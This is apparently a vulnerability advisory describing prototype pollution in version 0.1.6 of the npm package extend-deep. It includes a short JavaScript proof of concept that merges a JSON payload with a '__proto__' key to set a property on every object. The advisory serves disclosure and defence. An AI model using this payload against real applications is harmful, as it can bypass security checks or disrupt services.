

# 🦚Prototype Pollution in [extend-deep](https://www.npmjs.com/package/extend-deep)

Affected version: 0.1.6

## 📝 Description
The `extend-deep` package recursively merges objects without proper sanitization of the `__proto__` property. This allows attackers to pollute the global `Object.prototype`, affecting all objects in the application. When a malicious object with a `__proto__` property is merged, it modifies the base prototype, injecting properties that propagate to every existing and future object.

**Impact:** 
- Remote code execution
- Unexpected application behavior
- Bypass security checks
- Denial of service by overriding critical methods


## 💥 Proof of Concept (PoC)

```js
var extend = require("extend-deep");

let obj = {};
let ob2j = {};
console.log('Before:', obj.polluted); // undefined
const malicious = JSON.parse('{"__proto__": {"polluted": true}}');

extend(obj, malicious);

console.log('After:', obj.polluted); // true 
console.log(ob2j.polluted) // true
```
